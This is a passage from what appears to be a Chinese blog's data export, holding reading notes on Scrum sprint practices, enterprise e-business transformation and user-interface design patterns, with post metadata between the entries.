动作要快：行动越快，就会越早开始构建有形的产品，越早能够进行验证； 花钱买经验认知：因为构想活动产生的信息非常不确定，基本没有经过客户或用户验证；所以花太多时间在构想上面可能是浪费； 使用递增的资助方式：不要尝试产生太多信息来获得大额资助，只需要足以支持下一步开发即可； 快速学习并调头（即快速失败）； 第十八章 版本规划 版本规划是为了确认如下问题：什么时候完成？能够有什么特性？需要多少成本？ 规划时间：产品构想后即可进行；每个冲刺结束后也要进行； 参与人：利益干系人、Scrum团队； 过程：根据输入（产品列表&#x2F;愿景），权衡范围&#x2F;日期&#x2F;预算，得到一个版本规划（MRFs）； 两种类型：固定日期、固定范围；（前者比较契合SCRUM原则） 一些事项： 梳理产品列表； 细化最小可发布特性集； 冲刺映射（PBI归位，涉及多个团队之间协作的时候会特别有用）； 沟通进展情况：燃尽图、燃烧图； 第十九章 冲刺规划 概述：团队成员在一起商定冲刺目标，确定在下一个冲刺中交付哪些特性； 时间一般安排在每个冲刺开始前； 整个SCRUM团队的成员都一起参加； 输入：已经就绪的产品列表（价值清楚、细节充分、依赖已识别、人手齐备、已估算、接收标准清晰、知道如何演示）； 分解后的单个任务完成时间不超过8小时； 两种方式：两段式规划（故事+任务分解）、一次性规划（只到故事）； 产品列表就绪意味着团队需要共10%的时间来梳理产品列表； PBI选取原则：绝对不开始做完不成的条目，能完成才开始； 故事分解成任务会使得预测更加准确，从而使成员更加有信心； 如果出现特定技能人员的短板：不要一开始就分配任务，而是让团队成员在兑现过程中见机行事，适时、自主地选择工作； 第二十章 冲刺执行 输出：潜在可发布产品增量，一组有高度信心的已定义完成的PBI； 原则：由于大量的认识来源于实际的构建和测试，故理想原则是见机行事，逐步明确任务规划；当然，要提前发现重要的任务级依赖关系； 蜂拥式工作法：可以让团队和成员保持专注，从而提高效率；尽可能少的让多个PBI处于并行的状态； 注重良好的技术实践：测试驱动开发、结对编程、持续集成、重构、整体代码所有权、简约设计、编码标准； 每日例会：分享团队整体进度、消除等待、快速反馈； 任务板&#x2F;看板&#x2F;燃尽图：快速沟通冲刺进度、可视化工作流程 第二十一章 冲刺评审 评审的作用：让每一个参与的人，有机会检视和调整当前正在构建的产品； 参与者：内部&#x2F;外部利益干系人、产品负责人、SCRUM团队、销售&#x2F;市场人员等；（视情况而定，围绕目的邀请合适的人员参加） 评审的目的：为了获得反馈及认知，确保产品在沿着正确的方向前进； 产品负责人应该在冲刺过程中即逐步验收产品，而不是等到评审的那一天，这样可以进入快速反馈的循环过程； 评审过程中，如果时间允许，也让参与评审的关键人员试用一下产品； 评审的好处：参与人员的深入交谈与讨论，能够提出有建设性的、实际可行的调整建议； 通过评审，使得每一个人进一步了解当前开发工作的进展，从而会建立新的PBI、重新排序现有PBI、或删除不再需要的PBI； 对于大型开发工作，可能存在多个SCRUM团队，则可能各个团队的成果要集成后再演示，同时这样也可以节省利益干系人的评审时间； 第二十二章 冲刺回顾 回顾的目的：检视产品构建的过程，找出不足和改进办法，以便在后续落实和改进； 冲刺回顾的准备工作： 定义回顾重点：成长永无止境，只是可能需要重点更明确的回顾来发掘； 收集客观数据； 安排回顾时间日程； 回顾的方式： 营造氛围，让参与的人员具有安全感，而不是让其沦一场指责会或者吐槽会； 建立共同背景，即利用客观数据来对某些见解达成共识； 见解的静默分组法、点数投票法； 回顾结束时，让每个参与的成员说几句感谢的话； 冲刺回顾常见的问题： 不做回顾或参加的人很少； 不着边际、空洞无物； 对重大问题视而不见； 引导者能力不够； 郁闷； 指责游戏； 吐槽会； 代替特定的过程改进； 野心勃勃； 没有贯彻执行； 回顾的基本活动：营造氛围、通过数据建立共同背景、让大家达成共识、得出改进见解、确定改进措施、最后结束回顾并致谢；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"项目管理","slug":"项目管理","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"}]},{"title":"企业E化七步","slug":"企业E化七步","date":"2015-10-08T12:49:00.000Z","updated":"2024-09-22T23:12:32.046Z","comments":true,"path":"2015/10/08/企业E化七步/","permalink":"http://example.com/2015/10/08/%E4%BC%81%E4%B8%9AE%E5%8C%96%E4%B8%83%E6%AD%A5/","excerpt":"","text":"第一章 远景-开阔视野 电子商务不是一个只持续几年短期的行为，它是一种商务模式，代表提高（Enhance）和每日（Everyday）； 方向：利用电子网络和相关的技术来创造、提高、增强、转变企业的业务流程或业务体系，并使之为当前或潜在的客户创建更高的价值； 客户应该是一切电子商务存在的目的或理由； 惟一且永恒的问题：我们如何建立新的客户价值形式，或有效提高已经存在的客户价值形式？ 四个维度考虑问题： What 一个商务活动不仅仅是交易活动，它还包括交流、合作、学习、制造、创新、计划、招聘等；电子商务使得企业的运营方式得以改变，将转向以建立和协调与关键成员（客户、供应商、员工、合作伙伴）为主的管理方式； Who 不仅仅是消费者，还包括A~G：agent, business, customer, device, employer, family, government等；a Where 超越企业的界限，软件的终点是针对业务流程的富有成效的管理，外部供应商只是公司核心业务流程的延伸等； Why 不仅是成本，除了提高效率外，还包括做正确的事情； 设计一个电子商务方案应考虑几下几方面的影响： 它将会降低与消费者进行交易的成本吗？ 它将会缩短作为一个组织来说的反应时间吗？ 它将会加强我与贸易伙伴的联系吗？（需要做哪些联系，交流哪些信息，现有的联系方式如何） 它将会带来更高的客户维持能力吗？ 它将会加强我们与客户的联系吗？ 它将会创造占领市场的新途径吗？ 它将会带来新的收入现金流和市场扩张吗？ 它会彻底改造现在工厂里的业务吗？ 实施电子商务最终的四个成果（后三者更加具备战略意义）： 降低成本； 节约时间； 增加收入； 加强联系； 第二章 演化-攀登阶梯 电子商务转型的基础：客户需求； 实施电子商务的原因：为现在或潜在的客户提供全新和改进的价值计划（包括员工组成的内部客户）； 螺旋型的开发模式：不要一开始定义所有细节，而要首先定义具有最高优先权的特性，然后实现它，让用户试用，再做下一步调整和改进； 思考以下几个问题： 由谁负责（业务部门更了解客户需求）； 由谁投资（年度预算、内部市场机制、风险资本或融资购并）； 谁将受到影响（员工、最终客户、合作伙伴）； 集成的水平（整个企业的所有部门和所有动作都可以实现实时响应）； 谁来实施（外包过渡到内部）； 成果是什么（最初为节约费用和时间、然后体现在各种关系和新的收益上、最高层次为有效为行业定义新的发展空间甚至对行业彻底改造）； 电子商务的自我实现：满足以前从未遇到过的客户需求，创建客户以前从未有过的体验； 从哪里着手，思考以下问题，了解自己： 你是否使用大量的原材料和部件？ 哪些客户是在线客户，相互作用的程度如何？ 你是否拥有多层次的经销商和许多种不同类型的销售渠道？ 你是否花费大量的资金在新产品的研发工作上？ 你是否是一个“知识工厂“？ 发展电子商务经历的四个步骤：告知、自动（行动将影响到一系列逻辑相关的活动、最终是端到端的整个业务流程）、集成（业务流程超越企业界限，将各外部实体包含到了业务网站中）、再造（重新定义整个行业）； 网络将很久以前就存在的业务流程的效率和效力提高到了一个新的阶段；每个业务流程最终都会在某种程序上影响到客户体验； 第三章 战略-积木游戏 像建筑师一样全局的思考问题，而非工程师只考虑实现； 将电子商务看作是重新设计业务的一系列可扩展的工具；（相当于要站在业务经营者的角度来思考问题：假设拥有无限的资源，如何重新设计改造业务流程） 企业的功能定义、设计并且提供客户价值建议； 业务形式是它为落实价值计划所做的、所理解的和所具备的一切； 业务机构是将公司价值计划（它的功能）反映到它的产出、流程、能力和关系（它的形式）上；在产品和服务的提供方面它能够做什么、如何通过它为行为、能力和关系实现它想提供的东西； 绝大多数成功的公司不是建立在产品或技术创新的基础上，而是建立在业务创新的基础上-业务机构的创新（利用产品或技术创新为客户带来价值，只能转换后才有意义）； 业务架构的维度： 客户（服务对象）：细分市场、客户需求； 价值提供（输出结果）：产品、服务、信息； 资源（知识和权利）：人力资本、结构资本、关系资本； 流程（做什么）：认知流程、资源获取流程、运作流程、营销流程； 合作伙伴（与谁一起工作）：供应商、转销商、互补商； 利益驱动（获利方式）：利润来源、利润质量、利润安全性、潜在账本底线； 发展驱动（收入增长方式）：客户杠杆、供给杠杆、市场杠杆、潜在账本顶线； 增长可能沿着三个轴进行：客户轴（谁）、供给轴（什么）、位置轴（在哪儿）； 从传统中突变：让经理去想象自身业务“最可怕的竞争对手”是什么样子，潜在的竞争对手用什么样的方式将彻底破坏我们现有业务的利益和发展动力； 网络增强型收益管理：利用网络实时的根据需求确定价值提供、设计和实现大量提供给客户的价值； 网络增强型生命周期价值管理：不要将产品看作是一个交易，而要将它看作是一个和客户建立长期关系的机会，这种关系能够通过互联网的应用得到增强； 网络增强型资产杠杆：将互联网当作是产生战略优势的杠杆，首先要用全新的眼光看待你的资产； 网络增强型服务：例如通过网络为客户提供一个新的自我服务模式； 第四章 同步-打破边界 外部同步化：呈现给客户一致的面貌； 知识同步化：越过界限学习；在生产方面，同步化使得业务单位之间可以相互学习、合作以及更好地进行协调；在销售方面，同步化建立起了对客户和产品的统一认识，这就产生了一些新的聚合点、市场新观念和交叉销售、超值销售的新机会； 网络对渠道的影响：渠道扩散（少量实体、少量信息）、品牌增强（实体维如环境需求强的业务）、渠道拆析（纯粹信息传递的中间人情况）、渠道增加（针对交互复杂性的业务）； 渠道同步化：形成混合渠道模式，包括前后混合模式如MaryKay；并排混合模式如银行信用卡； 渠道分开再整合：针对不同的细分市场，在渠道功能拆解后，将不同渠道的功能进行组合，然后更好的服务各个细分市场； 第五章 基础-拨开迷雾 电子基础技术设施的四个构造模块： 客户层面：市场营销、销售和客户服务； 合作伙伴层面：协作销售与分销； 供应商层面：协同采购； 员工层面：内部交流与协作； 发展方向： 模块特性：从整体架构到组件基础技术设施； 同步化：从前后排序到共享流程； 网络资源：从资产所有到资源通道； 服务化：从静态应用系统到动态网络服务； 第六章 资本-稳操胜券 扩展视野，思想流最大化；案例：波音公司的“董事长创新行动”的长期基金； 分次下注：开发灵活的能力； 优化投资结构，评估项目投资组合：预期盈利、回收期、影响范围、竞争差别、可试验能力、能力风险、接受风险、集成风险； 选择未来之路：视能力为期权，用以优先级排序决策； 融资：为电子商务行动提供资金；企业范围和部门范围的不同融资方式； 第七章 组织-重整旗鼓 电子商务转型中的7个组织流程： 催化：从组织高层开始变革，通过创造欢迎变革的文化和一个共享的电子商务远景来激发组织的活力； 扩散：在组织的内部和外部广泛、深入地沟通电子商务远景，创建一种围绕电子商务的紧迫感； 激发：创建激励系统以提高变革的可接受性，并创建一种共享的文化； 技能培训：对员工进行新流程、新系统和新业务的培训，设立咨询计划以克服对未知领域的恐惧和对变革的抗拒； 结构：定义电子商务组织的角色和职责；集中与分散：基础技术框架集中，面向用户的内容分散； 员工：招聘电子商务团队的成员和领导者，定义电子商务团队的核心成员的技能和个人特性； 外部化：带上合作伙伴与供应商； 启迪：客户价值计划是我们的指南针；","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"信息化","slug":"信息化","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E5%8C%96/"}]},{"title":"界面设计模式","slug":"界面设计模式","date":"2015-08-25T13:37:00.000Z","updated":"2024-09-22T23:08:43.583Z","comments":true,"path":"2015/08/25/界面设计模式/","permalink":"http://example.com/2015/08/25/%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"合理的设计过程： 找出目标用户和他们的实际行为； 进行目标和任务分析，描述用户将如何对待你的产品； 进行模型设计，包括人物角色、情景、界面原型； 做可用性测试，以及现场观察用户如何使用产品；（验证想法）； 一、用户做些什么 好的设计源于对人的理解：人们喜欢什么，为什么会使用某种特定的软件，他们可能会怎样与之交互；用户的动机和意图是什么？他们希望使用的词汇、图标和应用姿态是什么？应用怎样才能为用户设置适当的期望？ 软件对用户而言，是达到某种目的的手段：寻找信息或对象、学习知识、进行交易、控制或监视、建造某种东西、和其他人交谈、娱乐； 设计界面的第一步：找出用户真正要达到的目标； 界面设计真正的艺术：解决正确的问题；（说明也有一些错误的问题，这种问题不值得去解决，或不应该由我们来解决，或者不是通过设计解决） 了解用户的最好方法：走出去，和他们接触；（有各种各样的调研方法） 需要从用户身上学习的内容：他们使用软件的目标；他们实现这些目标需要完成的具体任务；他们平常使用的语言和词汇；他们使用同等软件的技术水平；他们对你设计的目标对象的态度；以及不同的设计对这些态度的影响； 用户研究的方法：直接观察、案例研究、问卷调查、人物角色建模、焦点小组；（还包括用户访谈、现场试验、体验陈述、卡片法等） 用户的学习动机：有多强烈，导致设计界面的风格，比如功能强大方便熟练用户，或者功能简单方便新手用户； 人的行为特点：安全探索、即时满足、满意即可、中途变卦、延后选择、递增构建、习惯、小片时间、空间记忆、前瞻记忆、简化重复工作、支持键盘、旁人建议、个性化推荐； 二、组织内容：信息架构和应用结构 我们已经知道目标和任务，那么现在从数据和内容来反方向思考一下，如何组织、展示这些数据和内容，用户需要对他们进行什么操作、有几种展示方式？ 任何页面都是为了完成以下几件事：显示一个对象、显示一个列表或一组对象、为创建某个对象提供工具、辅助完成一项任务； 模式：是什么？什么时候用？为什么用？使用要点？ 主题、搜索和浏览：存在一个长列表；方便两种用户，一种知道找什么的人用搜索，一种不知道的用浏览；（购物网站即是典型） 新闻流：为用户提供及时的内容；容易对最新的消息进行跟踪；注意提供快速更新和刷新的机会； 图片管理器：用户想对图片进行处理；这是一个习惯用法，目的明确； 信息板：需要持续监视一些数据；仪表盘，习惯用法；注意视觉层次结构，尽量不滚动； 画布加调色板工具条：创建新对象时；习惯用法，有现实隐喻； 向导：任务有分支、或者冗长且单调无趣；分而治之，简化任务； 设置编辑器：需要设置偏好、需要登录、产品配置器–允许自定义设置；好找、分组；（90%的用户不会用，只用默认设置，10%的专家用户才会来用好像） 可选视图：应用的内容很复杂；用户偏好不同、需要不同查看方式、细节&amp;预览； 多工作空间：应用是用来查看或编辑某种内容；用户在进行多项任务，需要在任务间切换； 多级帮助：应用很复杂；针对不同级别的用户提供帮助文本； 三、导航、路标和找路 人们不迷路的一些常识性办法：阅读标记、环境线索、查看地图； 打开一个新网页或窗口都会带来认识上的代价；需要让距离尽量保持简短； 下一步去哪的决策过程：阅读标签、图标解码、单击不确定的链接； 载入时间会影响决策；（例如购物类网站，载入越慢，转化率越低） 常见导航模型：中心辐条（例如微信底栏）、充分连接（网状的，例如抽屉导航）、多级导航、渐进模型、金字塔模型（图片浏览）、平移和缩放（地图）、扁平导航、模态面板、清楚的入口点、书签、逃生舱；（这些模型之间可以混合使用） 常见模式：是什么？什么时候用？为什么用？如何使用？ 清楚的入口点：只显示几个入口；新用户或不常登录的网站；减少认识难度，容易上手试用； 菜单页面：填满链接；做一份目录让用户要可以选择去哪里；没有导航选择的干扰；（前提：用户知道自己来这里要寻找什么） 金字塔：BACK&#x2F;NEXT关联一组页面+1个主页面；想让用户看完一个后看下一个；减少点击次数，同时页面更具顺序性； 模态面板：只显示一个页面；需要处理，不然不准离开；因为必须处理；不用滥用； 深度链接：一个超链接；需要找到特定位置；省去时间精力直接跑到想要达到的地方；将当前位置做成URL保存下来； 逃生舱：一个链接可以点击离开；当用户被锁住的时候；可以安全撤离，鼓励探索； 胖菜单：下拉菜单中飞出长长的导航选择列表；很多分类和3个以上层次结构；让复杂的网站可发现性更好；组织、分类、标题； 页脚站点地图：不想占用页头和侧边进行导航；增强网站的可发现性；页头导航面向任务，页脚面向网站层级结构； 登录工具：经常需要登录；习惯用法；包含内容：退出、设置、帮助、消息、购物车、收藏夹、首页； 序列地图：线性访问；保持方向感； 面包屑层级结构：当有2级以上的层次结构，可以显示“你在这里”的标志；帮助用户得知当前的位置，上下文相关； 注释滚动条：当以文档为中心的应用或者需要平移+缩放的应用；页面快速滚动，用户不便阅读正文，此时注意力刚好在滚动条上； 动画转换：突然出现的东西或位置突然移动；理解变化的逻辑，保持空间感；(变亮、变暗、展开、收起、淡入、淡出、交叉淡化、自修复、滑动、探照灯) 四、组织页面：页面元素的布局 什么是好的视觉层次？体现各页面元素的相对重要性、各元素之间的关系； 如果体现相对重要性？字体（大小、颜色）、密度、背景颜色、位置和大小、节奏（列表、网格、错开的元素、空白隔开） 如何体现元素间的关系？有关系的放一起、无关系的隔开（格式塔的相似性与封闭性原理）、相似的元素彼此对等、包含关系； 好的层次-&gt;提供焦点，视觉流-&gt;将注意力从焦点引导到次要内容上面； 突出重点，不要贪心，不要用其他吸引眼球的东西来打断视觉流； 4个重要的格式塔原则：相邻性（找相关）、相似性（找规律）、连续性（强迫症）、封闭性（分块）； 相对平面设计的优点：可以动态显示，如模态TAB、手风琴、可收起面板、可移动面板、响应式展开、响应式允许； 常见模式： 视觉框架：总体规范，包括基本布局、颜色、格式方案等；为了让网站看起来像整体；不变+变化的部分，突出内容，不易迷失； 中央舞台：为用户显示连续的信息，构建某样东西；让清晰的元素一下抓住用户的注意力；大小、颜色、标题、上下文； 对等网格：很多内容元素，网格差不多，重要程度差不多；告诉用户它们类似，让页面看起来干净有序； 带标题的区域：内容分几个栏目，每栏目有个醒目标题；需要展示的内容很多，又要保持整洁，容易扫描和理解；为了用户容易消化、浏览、发现结构； 模态TAB：需要显示大量内容，但没法全部显示；有效的对大块内容进行分组和隐藏，保持界面整洁； 手风琴模式：需要显示大量的内容；有效的分组，保持界面整洁；（我觉得它更像是竖着放的TAB，但增加了层级，变得更强大了） 可收起面板：例如侧滑面板；显示次要内容，或者默认不需要展开；隐藏无关内容，让界面整洁； 可移动的面板：让用户有一定的控制权；不同用户有不同的关注点； 右&#x2F;左对齐：左边标签右对齐，右边标签左对齐；长短不一导致的太远或折行； 对角线平衡：通过将视觉重量放在左上角和右下角来使页面操持平衡；视觉上突出的元素，应该对页面平衡做出贡献； 响应式展开：任务复杂或者任务有分支；让任务简单化； 响应式允许：不想跳转页面，而是在一个页面保持所有元素；将任务简单化，避免用户出错； 流体布局：其实是页面内容自适应保持填满的状态；让用户根据设备情况拥有更多的屏幕控制权，可以更方便的工作；五、列表 列表的使用场景：获取概览、逐项浏览、查找特定列表项、排序和过滤、重新安排、删除、添加、分类列表项； 列表的非可视化特征：长度、顺序、分组、列表项类型、交互、动态行为； 常见模式： 双面板选择器：用户对每一项内容都有兴趣，想让用户看到整体结构，并在视图中一直保留列表；好处：减轻操作、视觉认知、空间记忆等三方面的负担； 单窗口深入：只有非常小的空间，不足以放置双面板或列表嵌入，或者列表项的内容非常大，需要整屏显示；受限空间几乎唯一的选择； 列表嵌入：列表项的细节信息不会占用很大的空间，想让用户看到整体结构；用户可以看到上下文，可以看到多个列表项的细节并进行比较； 缩略图网格：列表项拥有小的图形化展示方式，用户想获取整个列表的概览，并且快速扫视来找到特定对象；图片更容易识别； 传送带：列表项拥有图形化展示方式，没有足够空间使用缩略图网格；用户只能按顺序浏览，不能跳跃，鼓励用户探索； 斑马行：各行在视觉上难以区分，而用户需要在表格中查找特定数据；帮助用户从左到右浏览； 分页：列表非常长，用户只是查找特定项，不想看整个列表；将是否查看更多选项的选择权交给用户； 条目跳转：当用户键入名字，在表格中直接跳转到对应的列表项；用户更愿意通过键盘快速和准确的选择某一特定项；人类不善于在由单词或数字组成的列表中查找特定项，同时此方法可以让用户手不离开键盘； 字母滚动条：让用户尽可能便捷的找到特定项；使用方法自说明，为列表内容提供交互式的映射； 级联列表：层级结构很深，且每层都有很多列表项；相比大钢格式（windows采用的方式，级联是Mac采用的方式），视觉效果更好更美观； 树表：列表项是高度结构化，并具有用户感兴趣的特定属性； 新列表行：在第一个或最后一个就地创建新的列表项；用户需要添加新项，但没有过多空间放置按钮；创建方式简洁高效，简单明了；(如果放最后一个，则列表不能太长） 六、完成任务：动作与命令 常规的动作表现形式：按钮、菜单条、弹出菜单、下拉菜单、工具条、链接、动作面板、悬浮工具、在对象上双击、键盘动作、拖拽、命令行键入； 常见模式： 按钮组：相关动作分成一组；动作很多且需确保可见，不显杂乱；自我描述性，格式塔的相邻性；（163邮件列表上方的操作按钮） 悬浮工具：鼠标悬停时出现的按钮和动作；为了保持简洁，通常用于列表型界面，只适用鼠标界面，不适用触摸屏；最大好处：保持干净整洁；（163邮件列表，Evernote列表等） 动作面板：总是可见的在一个UI面板上显示一组动作；对一组对象的公用动作，保持可见性更好；好处：可见性、更多展示空间、自由展示的需要；（Picasa底部的图片编辑大按钮） 突出“完成”按钮：把完成一项事务的按钮放在视觉流的末尾，加大它的尺寸并提供合适的标签；让用户有一种完成的感觉； 智能菜单项：动态改变菜单的标签，以便在调用前显示其功能；确切表明它们将会做什么的菜单项会让用户容易理解；（什么是触发它的显示？） 预览：用户即将做一个重量级的操作时使用，或者执行一个很难预测结果的操作时使用；好处：可以避免用户错误操作，让应用变得有自我描述性； 进度提示：如果操作需要较长时间才能完成，比如超过2秒；如果界面一动不动，用户会失去耐心； 可取消性：提供某种方式取消一个耗时的操作；如果一个操作太过耗时即可使用；用户可能会改变主意，或用户知道可以取消会更愿意探索；（回收站是一个伟大的发明） 多级撤销：让容易可以摊销一系列操作；构建一个高度交互的界面时使用；用户能够安全的探索，不必担心犯错；（PS的操作历史记录） 命令历史：保存一份关于某些操作的可见性记录；当用户执行一系列冗长而且复杂的操作时；好处：回顾操作、重复操作、追踪操作； 宏：对一些小操作的组合；简化重复工作时使用； 七、显示复杂数据：树、表格及其他信息图形 用户使用信息图形的目的是了解一些信息，设计师需要弄清楚用户想了解什么；（所以不要随便设计信息图形，除非已经知道用户使用它的目的） 回答这些问题：数据是如何组织的、它们之间的关系如何、我能怎样进一步了解这些数据、我可以重新组织数据换一种查看方式吗、如何只把我想知道的数据显示给我、具体的数据值是多少； 数据模型：线性模型、表格模型、层次模型、网络模型、地理模型、文本型数据等； 前摄变量：谁和谁有关系，颜色、位置与对齐、亮度、方向、颜色饱和度、大小 、底纹、形状； 对数据进行探索：“焦点+上下文”，允许用户将注意力放在一个兴趣点上，同时在它周围显示足够多的素材，从而让用户有一种空间感； 常见的导航浏览技术：滚动和平移、缩放、打开和关闭兴趣点、深入到兴趣点内部； 排序和重新排列：更关注极端情况；（所以条形图或横条图都是从大到小或从小到大的顺序） 搜索和过滤：只为我显示我需要知道的内容；高度交互，尽快响应用户的搜索和过滤请求；迭代，不断细化搜索、查询和过滤；上下文相关；复杂类型，让用户可以通过条件测试对数据的假设，探索数据集； 得到具体数据值的几种方法：标签 、图例、坐标轴&#x2F;标尺&#x2F;比例&#x2F;时间轴、数据提示、数据焦点、数据刷； 常见模式： 总览加细节：总览图+细节图；让用户拥有总体感觉保持方向感，同时希望放大它们得一定程度的细节信息；好处：可以充当“你在这里”的标记； 数据提示：划过+浮窗；总体+隐藏时使用；好处：在总体视图中仍然可以查看特定数据值； 数据焦点：悬停兴趣点时高亮并模糊其他；图表包含太多信息，便于从中获取关系和追踪数据变得困难；好处：清除凌乱，聚焦兴趣点； 动态查询：即时和交互式的提供过滤数据集的方式；一份大型的、多变量的数据集，用户需要过滤某些数据来完成几个目标；好处：容易学习、鼓励探索；（比如可以勾选或不勾选几个变量） 数据刷：一个视图中选择数据，另一个视图中同步显示这些选中的数据；一个数据集显示了多个信息图形；好处：比动态查询更直观的数据探索，在更丰富的上下文中观察数据，多个视图的同步让数据得以更深入的了解； 局部缩放：鼠标位置的数据项变大易于阅读；当显示一个大型数据集时使用；好处：浏览细节的同时保留了上下文；（总览加细节、数据提示是替代方案） 可排序表格：界面显示多变量信息，用户需要进行探索、排序、搜索某个特定项；好处：有处于数据探索； 径向图：将表格显示为一个圆形；有一个长列表且需要显示任意数据间的关系；好处：可视化效果好； 多Y值图：堆积多个图表的线段，共享一个X轴；共享一个X轴，但在Y轴上描述不同的东西；好处：展示数据相关性； 多个小对象：用2-3个维度创建很多小图片，并用1-2个额外的维度平铺到整个页面；场景：需要2个以上的维度显示一个大型数据集；好处：多个小对象有丰富的数据，每一个小图片都讲一个独立的故事，当将它们放在一起时，讲了一个更大的故事； 树状地图：用不同大小的矩形来表示多维数据或层级结构的数据；场景：数据是树型的、或者多变量的，允许我们根据变量进行分组；好处：将一份大的数据集打包到一个空间中，有利于用户寻找变量之间的关系、趋势或一些特别的数据点; 八，获取用户的输入：表单与控件 几个原则： 确保用户了解需要提供什么信息，以及为什么要提供这些信息； 如果可以的话，根本不要提任何问题； 外界知识经常比脑袋中的知识更准确； 对错误敏感，并尽可能宽容； 小心表单的用词不要用编程的语言； 进行可用性测试； 选择的控件会影响用户对所问内容的期望，因此要进行明智的选择； 控件选择应考虑的因素： 可用的空间； 用户的电脑使用经验； 用户的领域经验； 来自其他应用的期望； 可用的技术； 常见模式： 容错格式：输入的数据混合了多种类型；用户只想把事情搞定，不考虑正确的格式； 结构化的格式：用一组文本框来反映输入的格式；让用户知道需要提供什么样的数据； 填空：将一些字段变成用户填写的空格；当标签声明的样式不够清楚的时候使用；好处：界面不言而喻；坏处：国际化时不方便，需要重排UI设计； 输入提示：用户不清楚文本框应填写的内容，标签又不想放太多文字；提示提供了标签没有的上下文；提示字体建议小两号；可以考虑获得输入焦点时再显示提示，这样界面会更简洁，但需要预留空间； 输入提醒：用提示信息预先填写在文本框中；输入提醒会更直接吸引视觉用户注意力；输入提醒有时可以替代标签；用底色区分必填项； 密码强度计：为用户提供即时反馈；防止用户使用弱口令； 自动完成：根据用户输入的内容，补全可能的选项；可以节省用户输入的工作量； 下拉选择器：通过下拉列表或者弹出面板，扩展成一个包含更多选择的界面；用户提供的输入是一种选择来自于一个集合；好处：把复杂的界面封装在一个很小的空间里； 列表构造器：源列表＋目的列表；从一个列表选择项目来创建另外一个列表；也可以使用带复选框的单一列表，但如果源列表很大，则不太适合；（将选项从左边列表移动到右边的列表，挺常用的） 良好的默认值：只要合适就提供默认值；好处：可以节省用户的输入工作； 同页错误信息：把错误信息和表单放在一起，如果可能，在产生错误的控件旁边也进行提示；好处：比弹窗的方式减少了跳转；（还少了用户点击） 九，利用社交媒体 使用社交媒体的原则： 倾听：知道人们在哪里讨论你的品牌／组织／产品，或者竞争对手；哪些宽泛的话题涉及你们品牌的目标和使命，以及人们在这些话题上面说了什么；如果你的组织会有积极的贡献，那么介入这些话题； 产生好的内容；（这一点本身就有很大的难度） 将好的内容提供给读者； 让读者决定内容的优劣； 让好内容可查找； 将读者的好内容和你的内容混合在一起； 促进社区； 常见模式： 编辑混合：混合新闻／故事／图片／视频等，避免自卖自夸；目的：提高知名度／组织亲善度／改善客户关系；主题和媒体类型越广泛越能吸引读者，内容本身要有趣； 个人声音：鼓励个人声音；如果组织里面有人愿意站出来；好处：为品牌注入个性，读者更愿意和真人建立联系； 转帖和评论： 发起会话： 倒置纳米金字塔： 择时策略： 专用流： 社交链接： 共享组件： 新闻框： 内容列表区域： 新近谈话： 十、迈向移动设计 在设计前应当思考的问题： 用户在使用移动设备时的真实需求是什么； 精简网站，只保留最基本的内容； 尽可能使用移动设备的硬件功能（地址位置、语音集成、手势操作、摄像机、振动、跳动等）； 把内容线性化； 优化最常用的交互序列（避免文本输入、精简页面减少加载次数、避免横向滚动、减少点击次数）； 常见模式： 纵向堆叠：纵向排列+文本折行；如果文本和表单为主、或切换页面成本过高；屏幕尺寸多种多样不可控； 胶片：传送带的移动版；通过小圆点暗示；鼓励用户探索新鲜内容；滑动是友好的手势操作，但此模式的扩展性较差，不适用页面很多的情况； 触摸工具：点触后显示工具按钮，如果视频播放器、图书阅读器，在沉浸式应用中鼓励使用；工具选项如果使用半透明更可以产生临时显示的效果； 底部导航：站点地图的移动简约版；需要呈现导航链接，但优先级不高时使用；确保足够高度使用每个导航链接容易点击； 小图片加文字列表：缩略图+文本；当需要呈现具有复杂内容的列表时且该内容都有相关图片时使用； 无限列表：列表询问放“加载更多”的按钮；如果列表很长时使用；加载更快，保留上下文，避免切换页面； 宽边界：加宽内容的周边使得可点击范围变大； 文本清除按钮：凡是有文本框的地方都应考虑放置这个按钮；（输入框内部右侧的小叉叉） 加载提示：由于移动带宽的慢速度，通过加载提示给用户心理过渡；样式有：进度条、圆圈等； 应用互联：在应用内放置其他应用的链接；如果应用内的数据具有明显可以使用其他应用操作的特征时应当使用；有利于在应用之间传递数据； 精简品牌形象：包括使用一致的商标、颜色方案及其他品牌元素；可靠、熟悉的品牌元素让用户反应良好； 十一、修饰外观：视觉风格和美感 一些设计的原则： 颜色：冷色调（冷静、严肃、准确）和暖色调（活泼、温暖、放松）、深色背景（深刻、阴暗、张力）和浅色背景（安静、放松、干净）、高对比度（紧张、有力、大胆）和低对比度（平滑、放松、舒适）、饱和色（有活力但长时间易疲劳）和不饱和色（单调宁静但长时间下比较舒适）、色调搭配（吸引注意力）； 排版：字体（有自己的声音）、空间和拥挤程度、曲线和角度、底纹和旋律； 图片：图片的存在是为了给设计设定一种感觉； 文化因素：具有主化含义的元素，同时考虑受众的年龄； 不断重现的视觉主题：角度处理、边界回应字体，目的：视觉完整性； 常见模式： 深色背景：用图片或渐变色做背景；让内容与背景之间产生距离感，吸引目光到内容上面；使用要点：柔和的焦点、颜色渐变、深度暗示、没有强烈的焦点； 少一点颜色、多一点价值：1种或2种颜色即可，不超过3种颜色；颜色过多会使界面变嘈杂分散用户注意力；使用要点：通过饱和度和明度的变化形成色板； 角度处理：用圆角代替直角；目的：比较不单调和更加舒缓而不是尖锐； 边界回应字体：边框的线条使用与字体相同的颜色和粗细；目的：有助于视觉的统一； 发丝：在边界或底线或分隔线上使用1像素宽的线条；效果：界面看起来更加精致优雅； 粗细字体对比：使用两种字体互相对照；效果：结构更清晰，页面更生动不单调（由于视觉对比造成的）； 